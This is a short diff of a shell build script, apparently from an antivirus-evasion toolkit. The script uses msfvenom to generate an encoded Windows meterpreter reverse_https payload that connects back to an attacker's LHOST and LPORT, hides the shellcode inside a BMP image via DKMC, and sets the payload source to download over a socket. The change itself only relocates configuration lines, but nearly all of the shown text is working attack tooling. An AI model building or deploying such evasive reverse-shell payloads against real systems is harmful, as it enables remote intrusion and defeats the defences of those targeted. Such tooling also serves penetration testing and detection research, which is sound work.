@@ -31,6 +31,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # don't enable debug output because printing the whole bmp payload takes a lot of time
 #enable_debug_print
 #CONFIGURATION_END
@@ -41,10 +44,6 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 cd ../DKMC
 printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format input/sc_c.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
 cd ../avet
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source download_socket
